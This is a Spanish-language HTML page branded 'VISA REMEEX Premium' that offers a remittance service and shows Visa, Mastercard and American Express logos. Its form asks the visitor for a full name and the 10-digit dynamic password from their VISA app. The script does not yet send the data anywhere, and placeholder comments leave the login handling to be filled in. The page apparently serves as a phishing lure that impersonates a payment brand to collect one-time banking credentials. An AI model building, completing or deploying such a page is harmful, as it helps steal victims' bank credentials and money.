<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>VISA REMEEX Premium</title>
  
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet" />
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    :root {
      --primary: #1a1f71;
      --secondary: #3b82f6;
      --accent: #60a5fa;
      --text-light: rgba(255, 255, 255, 0.95);
      --text-dark: #0f172a;
      --text-form: #000000; /* Color oscuro para texto en formularios */
      --overlay-dark: rgba(0, 0, 0, 0.4);
      --overlay-light: rgba(255, 255, 255, 0.15);
      --border-radius: 16px;
    }
    
    body {
      font-family: 'Inter', sans-serif;
      color: var(--text-light);
      line-height: 1.6;
      overflow-x: hidden;
      background-color: #000;
      min-height: 100vh;
    }
    
    /* Video de fondo */
    .video-background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
      overflow: hidden;
    }
    
    .video-background video {
      min-width: 100%;
      min-height: 100%;
      width: auto;
      height: auto;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      object-fit: cover;
    }
    
    /* Overlay para mejorar legibilidad */
    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: var(--overlay-dark);
      z-index: -1;
    }
    
    /* Contenedor principal */
    .main-container {
      width: 100%;
      max-width: 700px;
      margin: 0 auto;
      padding: 2rem 1rem;
    }
    
    /* Header */
    .header {
      text-align: center;
      margin-bottom: 2rem;
      padding: 2rem 0;
    }
    
    .header-logo {
      width: 70%;
      max-width: 300px;
      height: auto;
      margin-bottom: 1rem;
      filter: drop-shadow(0 0 10px rgba(0,0,0,0.3));
    }
    
    .header p {
      font-size: 1.2rem;
      text-shadow: 0 2px 10px rgba(0,0,0,0.6);
      max-width: 600px;
      margin: 0 auto;
    }
    
    /* Secciones de contenido */
    .content-section {
      background: var(--overlay-light);
      backdrop-filter: blur(10px);
      border-radius: var(--border-radius);
      padding: 2rem;
      margin-bottom: 2rem;
      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
    }
    
    .section-title {
      display: flex;
      align-items: center;
      gap: 0.75rem;
      margin-bottom: 1.5rem;
      color: var(--text-light);
      text-shadow: 0 1px 3px rgba(0,0,0,0.5);
    }
    
    .section-title i {
      font-size: 1.3rem;
    }
    
    /* Formularios */
    .form-group {
      margin-bottom: 1.5rem;
    }
    
    .form-label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: 500;
      color: var(--text-light);
      text-shadow: 0 1px 3px rgba(0,0,0,0.5);
    }
    
    .form-control {
      width: 100%;
      padding: 0.875rem 1.25rem;
      border: 1px solid rgba(255,255,255,0.2);
      border-radius: calc(var(--border-radius) / 2);
      font-size: 1rem;
      background: rgba(255,255,255,0.3); /* Fondo más blanco para mejor contraste */
      color: var(--text-form); /* Color de texto oscuro */
      transition: all 0.3s ease;
      font-weight: 500; /* Texto más visible */
    }
    
    .form-control::placeholder {
      color: rgba(0,0,0,0.5); /* Placeholder oscuro pero transparente */
    }
    
    .form-control:focus {
      outline: none;
      background: rgba(255,255,255,0.4); /* Fondo más blanco al enfocar */
      border-color: rgba(255,255,255,0.5);
    }
    
    /* Botones */
    .btn-row {
      display: flex;
      justify-content: space-between;
      margin-top: 1.5rem;
      gap: 1rem;
    }
    
    .btn {
      padding: 0.75rem 1.5rem;
      border: none;
      border-radius: calc(var(--border-radius) / 2);
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
    }
    
    .btn-primary {
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      color: white;
    }
    
    .btn-secondary {
      background: rgba(255,255,255,0.2);
      color: var(--text-light);
    }
    
    .btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
    }
    
    /* Logos de empresas */
    .logo-bar {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 2rem;
      margin: 1.5rem 0;
    }
    
    .logo-bar img {
      height: 30px;
      filter: brightness(0) invert(1);
      opacity: 0.8;
      transition: all 0.3s ease;
    }
    
    .logo-bar img:hover {
      opacity: 1;
      transform: scale(1.05);
    }
    
    /* Barra de progreso */
    .progress-container {
      width: 100%;
      height: 8px;
      background: rgba(255,255,255,0.1);
      border-radius: 10px;
      margin: 2rem 0;
      overflow: hidden;
    }
    
    .progress-bar {
      height: 100%;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      width: 0%;
      transition: width 0.5s ease;
    }
    
    /* Responsive */
    @media (max-width: 768px) {
      .header-logo {
        width: 80%;
      }
      
      .content-section {
        padding: 1.5rem;
      }
    }
    
    @media (max-width: 480px) {
      .btn-row {
        flex-direction: column;
      }
      
      .header-logo {
        width: 90%;
      }
    }
  </style>
</head>
<body>
  <!-- Video de fondo -->
  <div class="video-background">
    <video autoplay loop muted playsinline>
      <source src="https://i02.appmifile.com/activity-mi-web/fly-birds/xiaomi-hyperai/pc/kv_ai_head.mp4" type="video/mp4">
    </video>
  </div>
  
  <!-- Overlay para mejorar la legibilidad -->
  <div class="overlay"></div>
  
  <div class="main-container">
    <!-- Header -->
    <header class="header">
      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnBzNdjl6bNp-nIdaiHVENczJhwlJNA7ocsyiOObMmzbu8at0dY5yGcZ9cLxLF39qI6gwNfqBxlkTDC0txVULEwQVwGkeEzN0Jq9MRTRagA48mh18UqTlR4WhsXOLAEZugUyhqJHB19xJgnkpe-S5VOWFgzpKFwctv3XP9XhH41vNTvq0ZS-nik58Qhr-O/s320/remeex.png" alt="REMEEX Logo" class="header-logo">
      <p>Envía dinero al instante sin comisiones</p>
    </header>
    
    <!-- Logos de empresas -->
    <div class="logo-bar">
      <img src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" alt="Visa Logo">
      <img src="https://www.mastercard.es/content/dam/public/mastercardcom/es/favicon/mc-logo-52.svg" alt="MasterCard Logo">
      <img src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.8.0/package/dist/img/logos/dls-logo-stack.svg" alt="American Express Logo">
    </div>
    
    <!-- Barra de progreso -->
    <div class="progress-container">
      <div class="progress-bar" id="progressBarFill" style="width: 12.5%;"></div>
    </div>
    
    <!-- Contenido principal -->
    <section class="content-section active" id="step0">
      <h2 class="section-title"><i class="fas fa-user"></i> ¿Eres tú quien recibirá la remesa?</h2>
      <div class="form-group">
        <label class="form-label" for="fullName">Escribe tu nombre y apellido</label>
        <input type="text" class="form-control" id="fullName" placeholder="Ej: Juan Alberto Perez Rodriguez" />
      </div>
      <div class="form-group">
        <label class="form-label" for="password10">Busca tu contraseña dinámica de 10 dígitos en tu aplicación VISA</label>
        <input type="password" class="form-control" id="password10" maxlength="10" placeholder="10 dígitos" />
      </div>
      <div class="btn-row">
        <div style="visibility: hidden;">
          <button class="btn btn-secondary">Atrás</button>
        </div>
        <button class="btn btn-primary" id="loginBtn">
          Iniciar
          <i class="fas fa-arrow-right"></i>
        </button>
      </div>
    </section>
  </div>

  <script>
    // Aquí iría tu JavaScript simplificado para la navegación
    document.addEventListener('DOMContentLoaded', function() {
      // Ejemplo básico de funcionalidad
      const loginBtn = document.getElementById('loginBtn');
      const progressBar = document.getElementById('progressBarFill');
      
      if (loginBtn) {
        loginBtn.addEventListener('click', function() {
          const fullName = document.getElementById('fullName').value.trim();
          const password = document.getElementById('password10').value.trim();
          
          if (!fullName || !password) {
            alert('Por favor, completa todos los campos.');
            return;
          }
          
          // Progreso de ejemplo (animación)
          progressBar.style.width = '25%';
          
          // Aquí irían tus funciones para procesar el login
          alert('Formulario enviado correctamente.');
        });
      }
    });
  </script>
</body>
</html>
